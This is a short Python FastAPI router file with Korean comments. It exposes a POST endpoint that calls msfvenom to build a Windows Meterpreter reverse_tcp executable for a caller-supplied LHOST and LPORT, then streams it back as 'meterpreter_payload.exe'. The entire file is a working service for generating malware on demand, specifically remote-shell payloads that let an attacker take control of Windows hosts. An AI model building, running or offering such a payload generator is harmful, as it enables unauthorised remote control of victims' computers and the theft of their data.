from fastapi import APIRouter, HTTPException
from fastapi.responses import StreamingResponse
from Data.data import PayloadInfo
import subprocess

router = APIRouter()

def bytes_iterator(byte_data: bytes, chunk_size: int = 1024):
    """바이트 데이터를 조금씩 반환하는 제너레이터"""
    for i in range(0, len(byte_data), chunk_size):
        yield byte_data[i:i+chunk_size]

@router.post("/windows/meterpreter/reverse_tcp")
async def get_exe(info: PayloadInfo):
    # msfvenom을 사용하여 exe 파일을 stdout으로 출력
    command = [
        "msfvenom", 
        "-p", "windows/meterpreter/reverse_tcp", 
        f"LHOST={info.LHOST}",
        f"LPORT={info.LPORT}",
        "-f", "exe", 
        "-o", "/dev/stdout"
    ]

    # msfvenom을 실행하여 stdout을 직접 가져옴
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    # 실행 오류가 발생한 경우
    if process.returncode != 0:
        raise HTTPException(status_code=500, detail=f"Failed to generate exe: {stderr.decode()}")

    # 바이트 데이터를 바로 스트리밍
    return StreamingResponse(bytes_iterator(stdout), media_type="application/octet-stream", headers={'Content-Disposition': 'attachment; filename="meterpreter_payload.exe"'})
